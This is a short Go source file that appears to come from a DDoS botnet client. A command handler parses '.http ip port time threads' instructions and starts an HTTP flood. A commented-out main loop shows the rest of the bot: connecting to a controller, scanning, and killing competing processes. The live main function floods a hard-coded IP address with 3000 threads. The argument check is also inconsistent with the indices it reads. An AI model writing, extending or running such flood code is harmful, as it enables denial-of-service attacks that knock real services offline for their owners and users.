package main

import (
	//"bufio"
	//"fmt"
	"strconv"
	//"strings"
)

func handle_command(args []string) {

	// .method ip port time threads
	// 0       1  2    3    4
	if args[0][:1] != "." && len(args) != 4 {
		return
	}

	port, _   := strconv.Atoi(args[2])
	time, _   := strconv.Atoi(args[3])
	thread, _ := strconv.Atoi(args[4])

	switch args[0][1:] {
	case "http":
		go http_flood(args[1], port, time, thread)
		break
	}
}

func main() {
	/*bind_instance_port()
	go kill_all_by_port()
	go run_scanner()

	for {
		socket := init_socket()

		for {
			data, err := bufio.NewReader(socket).ReadString('\n')

			if err != nil {
				debug(fmt.Sprintf("Error when read buffer: %s", err))
				break
			}

			data = strings.Split(data, "\n")[0]
			args := strings.Split(data, " ")

			debug(fmt.Sprintf("Recieved command: %s | args: %d", data, len(args)))
			go handle_command(args)
		}
	}*/

	http_flood("37.187.9.26", 80, 15, 3000)
}
